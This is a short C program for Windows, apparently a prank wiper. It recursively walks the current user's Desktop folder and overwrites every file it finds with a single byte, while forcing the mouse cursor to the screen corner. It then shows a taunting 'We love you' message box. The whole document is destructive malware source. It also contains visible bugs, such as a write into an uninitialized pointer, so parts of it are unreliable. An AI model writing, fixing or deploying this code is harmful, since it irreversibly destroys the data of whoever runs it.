#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#define SUS "\x90"
#define SETCPOS \
        SetCursorPos(INT_MAX,INT_MAX)
    //0x7fffffff

void fill(const char *filename);
int recognize_dir(char *file);
void flame(char *basepath);

int main(){
    char *sus;
    wchar_t *sussybaka=_wgetenv(L"USERPROFILE");
    sprintf(sus,"%ls\\Desktop",sussybaka);
    flame(sus);
    MessageBox(NULL,"\nWe love you.\n\n:3\n\n",__FILE__,1);
    return 0;
}

void fill(const char *filename){
    SETCPOS;
    FILE *file=fopen(filename, "wb");
    fwrite(SUS, 1, sizeof(SUS), file);
    fclose(file);
}

int recognize_dir(char *file){
    struct stat isdir;
    stat(file, &isdir);
    return S_ISREG(isdir.st_mode);
}

void flame(char *basepath){
    DIR *ls;
    char *file, *deldir;
    struct dirent *dir;
    chdir(basepath);
    int a=0;
    ls=opendir(".");
    if(ls){
        while((dir=readdir(ls))!=NULL){
            file = dir->d_name;   
            if(strcmp(file, ".")+strcmp(file,"..")==2&&recognize_dir(file)==0){
                SETCPOS;
                char dirpath[256];
                sprintf(dirpath,"%s\\%s",_getcwd(NULL,0),file);
                flame(dirpath); //i love recursionz
                chdir("..");
            } else fill(file);
        }
        closedir(ls);
    }
}
